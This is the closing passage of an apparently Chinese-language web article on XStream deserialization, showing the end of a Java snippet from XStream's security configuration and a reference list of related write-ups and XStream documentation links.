        <span class="k">this</span><span class="o">.</span><span class="na">allowTypeHierarchy</span><span class="o">(</span><span class="n">Exception</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">this</span><span class="o">.</span><span class="na">securityInitialized</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="f503d2f53b5cb24996942410b303e9a1">8. 参考</h2>
<p><a href="https://paper.seebug.org/1543" target="_blank">https://paper.seebug.org/1543</a><br/>
<a href="https://www.cnblogs.com/nice0e3/p/15046895.html" target="_blank">https://www.cnblogs.com/nice0e3/p/15046895.html</a><br/>
<a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br/>
<a href="https://x-stream.github.io/javadoc/index.html" target="_blank">https://x-stream.github.io/javadoc/index.html</a><br/>
<a href="https://x-stream.github.io/tutorial.html" target="_blank">https://x-stream.github.io/tutorial.html</a><br/>
<a href="https://xz.aliyun.com/t/11372" target="_blank">https://xz.aliyun.com/t/11372</a><br/>
<a href="https://www.cnblogs.com/escape-w/p/16107046.html" target="_blank">https://www.cnblogs.com/escape-w/p/16107046.html</a></p>
</div>
</div>